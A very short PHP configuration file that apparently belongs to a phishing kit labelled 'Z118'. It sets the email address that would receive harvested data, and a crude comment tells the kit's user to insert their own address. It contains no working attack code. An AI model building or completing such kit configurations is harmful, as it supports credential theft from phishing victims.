<?php

/*   

*/

$Z118_EMAIL = "montesergamil@gmail.com"; // PUT UR FUCKING E-MAIL BRO
?>
